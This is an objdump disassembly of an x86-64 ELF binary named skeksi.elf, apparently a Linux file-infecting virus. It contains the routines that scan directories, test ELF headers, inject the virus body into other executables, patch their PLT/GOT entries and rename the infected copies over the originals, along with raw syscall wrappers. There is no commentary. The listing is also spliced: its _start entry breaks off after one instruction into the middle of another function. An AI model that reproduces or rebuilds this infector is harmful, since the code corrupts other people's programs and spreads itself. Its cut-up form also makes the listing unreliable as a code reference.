
skeksi.elf:     file format elf64-x86-64


Disassembly of section .text:

000000000040019c <_start>:
  40019c:	f3 0f 1e fa          	endbr64 
  401b7a:	e8 7d 10 00 00       	call   402bfc <_memcmp>
  401b7f:	85 c0                	test   eax,eax
  401b81:	74 0a                	je     401b8d <check_criteria+0xd3>
  401b83:	b8 ff ff ff ff       	mov    eax,0xffffffff
  401b88:	e9 a9 00 00 00       	jmp    401c36 <check_criteria+0x17c>
  401b8d:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  401b91:	48 83 c0 09          	add    rax,0x9
  401b95:	8b 00                	mov    eax,DWORD PTR [rax]
  401b97:	89 45 dc             	mov    DWORD PTR [rbp-0x24],eax
  401b9a:	81 7d dc 25 5d 01 00 	cmp    DWORD PTR [rbp-0x24],0x15d25
  401ba1:	75 0a                	jne    401bad <check_criteria+0xf3>
  401ba3:	b8 ff ff ff ff       	mov    eax,0xffffffff
  401ba8:	e9 89 00 00 00       	jmp    401c36 <check_criteria+0x17c>
  401bad:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  401bb1:	0f b7 40 10          	movzx  eax,WORD PTR [rax+0x10]
  401bb5:	66 83 f8 02          	cmp    ax,0x2
  401bb9:	74 07                	je     401bc2 <check_criteria+0x108>
  401bbb:	b8 ff ff ff ff       	mov    eax,0xffffffff
  401bc0:	eb 74                	jmp    401c36 <check_criteria+0x17c>
  401bc2:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  401bc6:	0f b7 40 12          	movzx  eax,WORD PTR [rax+0x12]
  401bca:	66 83 f8 3e          	cmp    ax,0x3e
  401bce:	74 07                	je     401bd7 <check_criteria+0x11d>
  401bd0:	b8 ff ff ff ff       	mov    eax,0xffffffff
  401bd5:	eb 5f                	jmp    401c36 <check_criteria+0x17c>
  401bd7:	c7 45 fc 00 00 00 00 	mov    DWORD PTR [rbp-0x4],0x0
  401bde:	c7 45 f8 00 00 00 00 	mov    DWORD PTR [rbp-0x8],0x0
  401be5:	eb 2d                	jmp    401c14 <check_criteria+0x15a>
  401be7:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  401bea:	48 63 d0             	movsxd rdx,eax
  401bed:	48 89 d0             	mov    rax,rdx
  401bf0:	48 c1 e0 03          	shl    rax,0x3
  401bf4:	48 29 d0             	sub    rax,rdx
  401bf7:	48 c1 e0 03          	shl    rax,0x3
  401bfb:	48 89 c2             	mov    rdx,rax
  401bfe:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  401c02:	48 01 d0             	add    rax,rdx
  401c05:	8b 00                	mov    eax,DWORD PTR [rax]
  401c07:	83 f8 02             	cmp    eax,0x2
  401c0a:	75 04                	jne    401c10 <check_criteria+0x156>
  401c0c:	83 45 fc 01          	add    DWORD PTR [rbp-0x4],0x1
  401c10:	83 45 f8 01          	add    DWORD PTR [rbp-0x8],0x1
  401c14:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  401c18:	0f b7 40 38          	movzx  eax,WORD PTR [rax+0x38]
  401c1c:	0f b7 c0             	movzx  eax,ax
  401c1f:	39 45 f8             	cmp    DWORD PTR [rbp-0x8],eax
  401c22:	7c c3                	jl     401be7 <check_criteria+0x12d>
  401c24:	83 7d fc 00          	cmp    DWORD PTR [rbp-0x4],0x0
  401c28:	75 07                	jne    401c31 <check_criteria+0x177>
  401c2a:	b8 ff ff ff ff       	mov    eax,0xffffffff
  401c2f:	eb 05                	jmp    401c36 <check_criteria+0x17c>
  401c31:	b8 00 00 00 00       	mov    eax,0x0
  401c36:	c9                   	leave  
  401c37:	c3                   	ret    

0000000000401c38 <do_main>:
  401c38:	f3 0f 1e fa          	endbr64 
  401c3c:	55                   	push   rbp
  401c3d:	48 89 e5             	mov    rbp,rsp
  401c40:	4c 8d 9c 24 00 80 ff 	lea    r11,[rsp-0x8000]
  401c47:	ff 
  401c48:	48 81 ec 00 10 00 00 	sub    rsp,0x1000
  401c4f:	48 83 0c 24 00       	or     QWORD PTR [rsp],0x0
  401c54:	4c 39 dc             	cmp    rsp,r11
  401c57:	75 ef                	jne    401c48 <do_main+0x10>
  401c59:	48 81 ec 60 03 00 00 	sub    rsp,0x360
  401c60:	48 89 bd a8 7c ff ff 	mov    QWORD PTR [rbp-0x8358],rdi
  401c67:	48 c7 45 90 00 00 00 	mov    QWORD PTR [rbp-0x70],0x0
  401c6e:	00 
  401c6f:	48 c7 45 e8 00 00 00 	mov    QWORD PTR [rbp-0x18],0x0
  401c76:	00 
  401c77:	c7 45 f8 04 00 00 00 	mov    DWORD PTR [rbp-0x8],0x4
  401c7e:	c7 45 f4 00 00 00 00 	mov    DWORD PTR [rbp-0xc],0x0
  401c85:	48 8d 05 09 11 00 00 	lea    rax,[rip+0x1109]        # 402d95 <display_skeksi+0x104>
  401c8c:	48 89 85 e0 7c ff ff 	mov    QWORD PTR [rbp-0x8320],rax
  401c93:	48 8d 05 01 11 00 00 	lea    rax,[rip+0x1101]        # 402d9b <display_skeksi+0x10a>
  401c9a:	48 89 85 e8 7c ff ff 	mov    QWORD PTR [rbp-0x8318],rax
  401ca1:	48 8d 05 fd 10 00 00 	lea    rax,[rip+0x10fd]        # 402da5 <display_skeksi+0x114>
  401ca8:	48 89 85 f0 7c ff ff 	mov    QWORD PTR [rbp-0x8310],rax
  401caf:	48 8d 05 f4 10 00 00 	lea    rax,[rip+0x10f4]        # 402daa <display_skeksi+0x119>
  401cb6:	48 89 85 f8 7c ff ff 	mov    QWORD PTR [rbp-0x8308],rax
  401cbd:	66 c7 85 de 7c ff ff 	mov    WORD PTR [rbp-0x8322],0x2e
  401cc4:	2e 00 
  401cc6:	48 8d 85 de 7c ff ff 	lea    rax,[rbp-0x8322]
  401ccd:	48 89 45 e8          	mov    QWORD PTR [rbp-0x18],rax
  401cd1:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  401cd5:	48 8d 35 d7 10 00 00 	lea    rsi,[rip+0x10d7]        # 402db3 <display_skeksi+0x122>
  401cdc:	48 89 c7             	mov    rdi,rax
  401cdf:	e8 b8 0e 00 00       	call   402b9c <_strcmp>
  401ce4:	85 c0                	test   eax,eax
  401ce6:	75 07                	jne    401cef <do_main+0xb7>
  401ce8:	c7 45 f8 01 00 00 00 	mov    DWORD PTR [rbp-0x8],0x1
  401cef:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  401cf3:	ba 00 00 00 00       	mov    edx,0x0
  401cf8:	be 00 00 01 00       	mov    esi,0x10000
  401cfd:	48 89 c7             	mov    rdi,rax
  401d00:	e8 cf 02 00 00       	call   401fd4 <_open>
  401d05:	89 45 e4             	mov    DWORD PTR [rbp-0x1c],eax
  401d08:	83 7d e4 00          	cmp    DWORD PTR [rbp-0x1c],0x0
  401d0c:	0f 88 7f 02 00 00    	js     401f91 <do_main+0x359>
  401d12:	48 8d 85 00 7e ff ff 	lea    rax,[rbp-0x8200]
  401d19:	48 89 c7             	mov    rdi,rax
  401d1c:	e8 b1 f0 ff ff       	call   400dd2 <load_self>
  401d21:	8b 45 e4             	mov    eax,DWORD PTR [rbp-0x1c]
  401d24:	48 8d 8d 90 7f ff ff 	lea    rcx,[rbp-0x8070]
  401d2b:	ba 00 80 00 00       	mov    edx,0x8000
  401d30:	48 89 ce             	mov    rsi,rcx
  401d33:	89 c7                	mov    edi,eax
  401d35:	e8 7f 05 00 00       	call   4022b9 <_getdents64>
  401d3a:	89 45 e0             	mov    DWORD PTR [rbp-0x20],eax
  401d3d:	83 7d e0 00          	cmp    DWORD PTR [rbp-0x20],0x0
  401d41:	0f 88 4d 02 00 00    	js     401f94 <do_main+0x35c>
  401d47:	83 7d e0 00          	cmp    DWORD PTR [rbp-0x20],0x0
  401d4b:	0f 84 e8 01 00 00    	je     401f39 <do_main+0x301>
  401d51:	c7 45 dc 00 00 00 00 	mov    DWORD PTR [rbp-0x24],0x0
  401d58:	c7 45 fc 00 00 00 00 	mov    DWORD PTR [rbp-0x4],0x0
  401d5f:	e9 c4 01 00 00       	jmp    401f28 <do_main+0x2f0>
  401d64:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  401d67:	48 98                	cdqe   
  401d69:	48 8d 95 90 7f ff ff 	lea    rdx,[rbp-0x8070]
  401d70:	48 01 d0             	add    rax,rdx
  401d73:	48 89 45 d0          	mov    QWORD PTR [rbp-0x30],rax
  401d77:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
  401d7b:	0f b7 40 10          	movzx  eax,WORD PTR [rax+0x10]
  401d7f:	0f b7 c0             	movzx  eax,ax
  401d82:	83 e8 01             	sub    eax,0x1
  401d85:	01 45 fc             	add    DWORD PTR [rbp-0x4],eax
  401d88:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
  401d8c:	48 83 c0 13          	add    rax,0x13
  401d90:	48 8d 35 1e 10 00 00 	lea    rsi,[rip+0x101e]        # 402db5 <display_skeksi+0x124>
  401d97:	48 89 c7             	mov    rdi,rax
  401d9a:	e8 fd 0d 00 00       	call   402b9c <_strcmp>
  401d9f:	85 c0                	test   eax,eax
  401da1:	0f 84 76 01 00 00    	je     401f1d <do_main+0x2e5>
  401da7:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
  401dab:	0f b6 40 13          	movzx  eax,BYTE PTR [rax+0x13]
  401daf:	3c 2e                	cmp    al,0x2e
  401db1:	0f 84 69 01 00 00    	je     401f20 <do_main+0x2e8>
  401db7:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
  401dbb:	48 8d 48 13          	lea    rcx,[rax+0x13]
  401dbf:	48 8d 55 90          	lea    rdx,[rbp-0x70]
  401dc3:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  401dc7:	48 89 c6             	mov    rsi,rax
  401dca:	48 89 cf             	mov    rdi,rcx
  401dcd:	e8 6a e6 ff ff       	call   40043c <full_path>
  401dd2:	48 89 45 c8          	mov    QWORD PTR [rbp-0x38],rax
  401dd6:	48 8b 45 c8          	mov    rax,QWORD PTR [rbp-0x38]
  401dda:	48 89 c7             	mov    rdi,rax
  401ddd:	e8 d8 fc ff ff       	call   401aba <check_criteria>
  401de2:	85 c0                	test   eax,eax
  401de4:	0f 88 39 01 00 00    	js     401f23 <do_main+0x2eb>
  401dea:	83 7d f4 00          	cmp    DWORD PTR [rbp-0xc],0x0
  401dee:	74 39                	je     401e29 <do_main+0x1f1>
  401df0:	c7 45 9c 0a 00 00 00 	mov    DWORD PTR [rbp-0x64],0xa
  401df7:	48 8d 85 b0 7c ff ff 	lea    rax,[rbp-0x8350]
  401dfe:	be 00 00 00 00       	mov    esi,0x0
  401e03:	48 89 c7             	mov    rdi,rax
  401e06:	e8 e2 04 00 00       	call   4022ed <_gettimeofday>
  401e0b:	48 8d 85 b0 7c ff ff 	lea    rax,[rbp-0x8350]
  401e12:	48 83 c0 08          	add    rax,0x8
  401e16:	48 89 c7             	mov    rdi,rax
  401e19:	e8 da e5 ff ff       	call   4003f8 <_rand>
  401e1e:	99                   	cdq    
  401e1f:	f7 7d 9c             	idiv   DWORD PTR [rbp-0x64]
  401e22:	89 d0                	mov    eax,edx
  401e24:	89 45 c4             	mov    DWORD PTR [rbp-0x3c],eax
  401e27:	eb 01                	jmp    401e2a <do_main+0x1f2>
  401e29:	90                   	nop
  401e2a:	48 8d 95 00 7d ff ff 	lea    rdx,[rbp-0x8300]
  401e31:	48 8b 45 c8          	mov    rax,QWORD PTR [rbp-0x38]
  401e35:	48 89 d6             	mov    rsi,rdx
  401e38:	48 89 c7             	mov    rdi,rax
  401e3b:	e8 b3 f0 ff ff       	call   400ef3 <load_target>
  401e40:	48 8d 95 00 7d ff ff 	lea    rdx,[rbp-0x8300]
  401e47:	48 8d 85 00 7e ff ff 	lea    rax,[rbp-0x8200]
  401e4e:	48 89 d6             	mov    rsi,rdx
  401e51:	48 89 c7             	mov    rdi,rax
  401e54:	e8 95 e9 ff ff       	call   4007ee <infect_elf_file>
  401e59:	48 89 45 b8          	mov    QWORD PTR [rbp-0x48],rax
  401e5d:	48 8d 85 00 7d ff ff 	lea    rax,[rbp-0x8300]
  401e64:	48 89 c7             	mov    rdi,rax
  401e67:	e8 48 f0 ff ff       	call   400eb4 <unload_target>
  401e6c:	48 8d 85 00 7d ff ff 	lea    rax,[rbp-0x8300]
  401e73:	48 89 c6             	mov    rsi,rax
  401e76:	48 8d 3d 93 0e 00 00 	lea    rdi,[rip+0xe93]        # 402d10 <display_skeksi+0x7f>
  401e7d:	e8 88 f4 ff ff       	call   40130a <load_target_writeable>
  401e82:	e8 ce 0d 00 00       	call   402c55 <get_rip>
  401e87:	48 c7 c2 62 2c 40 00 	mov    rdx,0x402c62
  401e8e:	48 89 d1             	mov    rcx,rdx
  401e91:	48 c7 c2 9c 01 40 00 	mov    rdx,0x40019c
  401e98:	48 29 d1             	sub    rcx,rdx
  401e9b:	48 89 ca             	mov    rdx,rcx
  401e9e:	48 29 d0             	sub    rax,rdx
  401ea1:	48 89 45 b0          	mov    QWORD PTR [rbp-0x50],rax
  401ea5:	e8 ab 0d 00 00       	call   402c55 <get_rip>
  401eaa:	48 c7 c2 62 2c 40 00 	mov    rdx,0x402c62
  401eb1:	48 89 d1             	mov    rcx,rdx
  401eb4:	48 c7 c2 e1 01 40 00 	mov    rdx,0x4001e1
  401ebb:	48 29 d1             	sub    rcx,rdx
  401ebe:	48 89 ca             	mov    rdx,rcx
  401ec1:	48 29 d0             	sub    rax,rdx
  401ec4:	48 89 45 a8          	mov    QWORD PTR [rbp-0x58],rax
  401ec8:	48 8b 45 a8          	mov    rax,QWORD PTR [rbp-0x58]
  401ecc:	48 2b 45 b0          	sub    rax,QWORD PTR [rbp-0x50]
  401ed0:	48 89 45 a0          	mov    QWORD PTR [rbp-0x60],rax
  401ed4:	48 8b 55 b8          	mov    rdx,QWORD PTR [rbp-0x48]
  401ed8:	48 8b 45 a0          	mov    rax,QWORD PTR [rbp-0x60]
  401edc:	48 01 d0             	add    rax,rdx
  401edf:	48 8d 50 40          	lea    rdx,[rax+0x40]
  401ee3:	48 8d 85 00 7d ff ff 	lea    rax,[rbp-0x8300]
  401eea:	48 89 d6             	mov    rsi,rdx
  401eed:	48 89 c7             	mov    rdi,rax
  401ef0:	e8 2c f8 ff ff       	call   401721 <infect_pltgot>
  401ef5:	48 8d 85 00 7d ff ff 	lea    rax,[rbp-0x8300]
  401efc:	48 89 c7             	mov    rdi,rax
  401eff:	e8 b0 ef ff ff       	call   400eb4 <unload_target>
  401f04:	48 8b 45 c8          	mov    rax,QWORD PTR [rbp-0x38]
  401f08:	48 89 c6             	mov    rsi,rax
  401f0b:	48 8d 3d fe 0d 00 00 	lea    rdi,[rip+0xdfe]        # 402d10 <display_skeksi+0x7f>
  401f12:	e8 d1 01 00 00       	call   4020e8 <_rename>
  401f17:	83 45 f4 01          	add    DWORD PTR [rbp-0xc],0x1
  401f1b:	eb 07                	jmp    401f24 <do_main+0x2ec>
  401f1d:	90                   	nop
  401f1e:	eb 04                	jmp    401f24 <do_main+0x2ec>
  401f20:	90                   	nop
  401f21:	eb 01                	jmp    401f24 <do_main+0x2ec>
  401f23:	90                   	nop
  401f24:	83 45 fc 01          	add    DWORD PTR [rbp-0x4],0x1
  401f28:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  401f2b:	3b 45 e0             	cmp    eax,DWORD PTR [rbp-0x20]
  401f2e:	0f 8c 30 fe ff ff    	jl     401d64 <do_main+0x12c>
  401f34:	e9 e8 fd ff ff       	jmp    401d21 <do_main+0xe9>
  401f39:	90                   	nop
  401f3a:	83 6d f8 01          	sub    DWORD PTR [rbp-0x8],0x1
  401f3e:	83 7d f8 00          	cmp    DWORD PTR [rbp-0x8],0x0
  401f42:	7e 0f                	jle    401f53 <do_main+0x31b>
  401f44:	8b 45 e4             	mov    eax,DWORD PTR [rbp-0x1c]
  401f47:	89 c7                	mov    edi,eax
  401f49:	e8 bc 00 00 00       	call   40200a <_close>
  401f4e:	e9 73 fd ff ff       	jmp    401cc6 <do_main+0x8e>
  401f53:	c7 45 98 32 00 00 00 	mov    DWORD PTR [rbp-0x68],0x32
  401f5a:	48 8d 85 c0 7c ff ff 	lea    rax,[rbp-0x8340]
  401f61:	be 00 00 00 00       	mov    esi,0x0
  401f66:	48 89 c7             	mov    rdi,rax
  401f69:	e8 7f 03 00 00       	call   4022ed <_gettimeofday>
  401f6e:	48 8d 85 c0 7c ff ff 	lea    rax,[rbp-0x8340]
  401f75:	48 83 c0 08          	add    rax,0x8
  401f79:	48 89 c7             	mov    rdi,rax
  401f7c:	e8 77 e4 ff ff       	call   4003f8 <_rand>
  401f81:	99                   	cdq    
  401f82:	f7 7d 98             	idiv   DWORD PTR [rbp-0x68]
  401f85:	89 d0                	mov    eax,edx
  401f87:	89 45 c4             	mov    DWORD PTR [rbp-0x3c],eax
  401f8a:	e8 02 0d 00 00       	call   402c91 <display_skeksi>
  401f8f:	eb 04                	jmp    401f95 <do_main+0x35d>
  401f91:	90                   	nop
  401f92:	eb 01                	jmp    401f95 <do_main+0x35d>
  401f94:	90                   	nop
  401f95:	c9                   	leave  
  401f96:	c3                   	ret    

0000000000401f97 <_getuid>:
  401f97:	f3 0f 1e fa          	endbr64 
  401f9b:	55                   	push   rbp
  401f9c:	48 89 e5             	mov    rbp,rsp
  401f9f:	48 c7 c0 66 00 00 00 	mov    rax,0x66
  401fa6:	0f 05                	syscall 
  401fa8:	48 89 c0             	mov    rax,rax
  401fab:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  401faf:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  401fb3:	5d                   	pop    rbp
  401fb4:	c3                   	ret    

0000000000401fb5 <Exit>:
  401fb5:	f3 0f 1e fa          	endbr64 
  401fb9:	55                   	push   rbp
  401fba:	48 89 e5             	mov    rbp,rsp
  401fbd:	48 89 7d f8          	mov    QWORD PTR [rbp-0x8],rdi
  401fc1:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  401fc5:	48 89 c7             	mov    rdi,rax
  401fc8:	48 c7 c0 3c 00 00 00 	mov    rax,0x3c
  401fcf:	0f 05                	syscall 
  401fd1:	90                   	nop
  401fd2:	5d                   	pop    rbp
  401fd3:	c3                   	ret    

0000000000401fd4 <_open>:
  401fd4:	f3 0f 1e fa          	endbr64 
  401fd8:	55                   	push   rbp
  401fd9:	48 89 e5             	mov    rbp,rsp
  401fdc:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  401fe0:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  401fe4:	48 89 55 d8          	mov    QWORD PTR [rbp-0x28],rdx
  401fe8:	48 8b 7d e8          	mov    rdi,QWORD PTR [rbp-0x18]
  401fec:	48 8b 75 e0          	mov    rsi,QWORD PTR [rbp-0x20]
  401ff0:	48 8b 55 d8          	mov    rdx,QWORD PTR [rbp-0x28]
  401ff4:	48 c7 c0 02 00 00 00 	mov    rax,0x2
  401ffb:	0f 05                	syscall 
  401ffd:	48 89 c0             	mov    rax,rax
  402000:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  402004:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402008:	5d                   	pop    rbp
  402009:	c3                   	ret    

000000000040200a <_close>:
  40200a:	f3 0f 1e fa          	endbr64 
  40200e:	55                   	push   rbp
  40200f:	48 89 e5             	mov    rbp,rsp
  402012:	89 7d ec             	mov    DWORD PTR [rbp-0x14],edi
  402015:	48 8b 7d ec          	mov    rdi,QWORD PTR [rbp-0x14]
  402019:	48 c7 c0 03 00 00 00 	mov    rax,0x3
  402020:	0f 05                	syscall 
  402022:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402026:	5d                   	pop    rbp
  402027:	c3                   	ret    

0000000000402028 <_read>:
  402028:	f3 0f 1e fa          	endbr64 
  40202c:	55                   	push   rbp
  40202d:	48 89 e5             	mov    rbp,rsp
  402030:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  402034:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  402038:	48 89 55 d8          	mov    QWORD PTR [rbp-0x28],rdx
  40203c:	48 8b 7d e8          	mov    rdi,QWORD PTR [rbp-0x18]
  402040:	48 8b 75 e0          	mov    rsi,QWORD PTR [rbp-0x20]
  402044:	48 8b 55 d8          	mov    rdx,QWORD PTR [rbp-0x28]
  402048:	48 c7 c0 00 00 00 00 	mov    rax,0x0
  40204f:	0f 05                	syscall 
  402051:	48 89 c0             	mov    rax,rax
  402054:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  402058:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  40205c:	5d                   	pop    rbp
  40205d:	c3                   	ret    

000000000040205e <_write>:
  40205e:	f3 0f 1e fa          	endbr64 
  402062:	55                   	push   rbp
  402063:	48 89 e5             	mov    rbp,rsp
  402066:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  40206a:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  40206e:	48 89 55 d8          	mov    QWORD PTR [rbp-0x28],rdx
  402072:	48 8b 7d e8          	mov    rdi,QWORD PTR [rbp-0x18]
  402076:	48 8b 75 e0          	mov    rsi,QWORD PTR [rbp-0x20]
  40207a:	48 8b 55 d8          	mov    rdx,QWORD PTR [rbp-0x28]
  40207e:	48 c7 c0 01 00 00 00 	mov    rax,0x1
  402085:	0f 05                	syscall 
  402087:	48 89 c0             	mov    rax,rax
  40208a:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  40208e:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402092:	5d                   	pop    rbp
  402093:	c3                   	ret    

0000000000402094 <_fstat>:
  402094:	f3 0f 1e fa          	endbr64 
  402098:	55                   	push   rbp
  402099:	48 89 e5             	mov    rbp,rsp
  40209c:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  4020a0:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  4020a4:	48 8b 7d e8          	mov    rdi,QWORD PTR [rbp-0x18]
  4020a8:	48 8b 75 e0          	mov    rsi,QWORD PTR [rbp-0x20]
  4020ac:	48 c7 c0 05 00 00 00 	mov    rax,0x5
  4020b3:	0f 05                	syscall 
  4020b5:	48 89 c0             	mov    rax,rax
  4020b8:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  4020bc:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  4020c0:	5d                   	pop    rbp
  4020c1:	c3                   	ret    

00000000004020c2 <_unlink>:
  4020c2:	f3 0f 1e fa          	endbr64 
  4020c6:	55                   	push   rbp
  4020c7:	48 89 e5             	mov    rbp,rsp
  4020ca:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  4020ce:	48 8b 7d e8          	mov    rdi,QWORD PTR [rbp-0x18]
  4020d2:	48 c7 c0 57 00 00 00 	mov    rax,0x57
  4020d9:	0f 05                	syscall 
  4020db:	48 89 c0             	mov    rax,rax
  4020de:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  4020e2:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  4020e6:	5d                   	pop    rbp
  4020e7:	c3                   	ret    

00000000004020e8 <_rename>:
  4020e8:	f3 0f 1e fa          	endbr64 
  4020ec:	55                   	push   rbp
  4020ed:	48 89 e5             	mov    rbp,rsp
  4020f0:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  4020f4:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  4020f8:	48 8b 7d e8          	mov    rdi,QWORD PTR [rbp-0x18]
  4020fc:	48 8b 75 e0          	mov    rsi,QWORD PTR [rbp-0x20]
  402100:	48 c7 c0 52 00 00 00 	mov    rax,0x52
  402107:	0f 05                	syscall 
  402109:	48 89 c0             	mov    rax,rax
  40210c:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  402110:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402114:	5d                   	pop    rbp
  402115:	c3                   	ret    

0000000000402116 <_lseek>:
  402116:	f3 0f 1e fa          	endbr64 
  40211a:	55                   	push   rbp
  40211b:	48 89 e5             	mov    rbp,rsp
  40211e:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  402122:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  402126:	89 55 dc             	mov    DWORD PTR [rbp-0x24],edx
  402129:	48 8b 7d e8          	mov    rdi,QWORD PTR [rbp-0x18]
  40212d:	48 8b 75 e0          	mov    rsi,QWORD PTR [rbp-0x20]
  402131:	48 8b 55 dc          	mov    rdx,QWORD PTR [rbp-0x24]
  402135:	48 c7 c0 08 00 00 00 	mov    rax,0x8
  40213c:	0f 05                	syscall 
  40213e:	48 89 c0             	mov    rax,rax
  402141:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  402145:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402149:	5d                   	pop    rbp
  40214a:	c3                   	ret    

000000000040214b <_fsync>:
  40214b:	f3 0f 1e fa          	endbr64 
  40214f:	55                   	push   rbp
  402150:	48 89 e5             	mov    rbp,rsp
  402153:	89 7d ec             	mov    DWORD PTR [rbp-0x14],edi
  402156:	48 8b 7d ec          	mov    rdi,QWORD PTR [rbp-0x14]
  40215a:	48 c7 c0 4a 00 00 00 	mov    rax,0x4a
  402161:	0f 05                	syscall 
  402163:	48 89 c0             	mov    rax,rax
  402166:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  40216a:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  40216e:	5d                   	pop    rbp
  40216f:	c3                   	ret    

0000000000402170 <_mmap>:
  402170:	f3 0f 1e fa          	endbr64 
  402174:	55                   	push   rbp
  402175:	48 89 e5             	mov    rbp,rsp
  402178:	48 89 7d d8          	mov    QWORD PTR [rbp-0x28],rdi
  40217c:	48 89 75 d0          	mov    QWORD PTR [rbp-0x30],rsi
  402180:	48 89 55 c8          	mov    QWORD PTR [rbp-0x38],rdx
  402184:	48 89 4d c0          	mov    QWORD PTR [rbp-0x40],rcx
  402188:	4c 89 45 b8          	mov    QWORD PTR [rbp-0x48],r8
  40218c:	4c 89 4d b0          	mov    QWORD PTR [rbp-0x50],r9
  402190:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  402194:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  402198:	48 8b 45 b0          	mov    rax,QWORD PTR [rbp-0x50]
  40219c:	48 89 45 f0          	mov    QWORD PTR [rbp-0x10],rax
  4021a0:	48 8b 45 c0          	mov    rax,QWORD PTR [rbp-0x40]
  4021a4:	48 89 45 e8          	mov    QWORD PTR [rbp-0x18],rax
  4021a8:	48 8b 7d d8          	mov    rdi,QWORD PTR [rbp-0x28]
  4021ac:	48 8b 75 d0          	mov    rsi,QWORD PTR [rbp-0x30]
  4021b0:	48 8b 55 c8          	mov    rdx,QWORD PTR [rbp-0x38]
  4021b4:	4c 8b 55 c0          	mov    r10,QWORD PTR [rbp-0x40]
  4021b8:	4c 8b 45 f8          	mov    r8,QWORD PTR [rbp-0x8]
  4021bc:	4c 8b 4d f0          	mov    r9,QWORD PTR [rbp-0x10]
  4021c0:	48 c7 c0 09 00 00 00 	mov    rax,0x9
  4021c7:	0f 05                	syscall 
  4021c9:	48 89 c0             	mov    rax,rax
  4021cc:	48 89 45 e0          	mov    QWORD PTR [rbp-0x20],rax
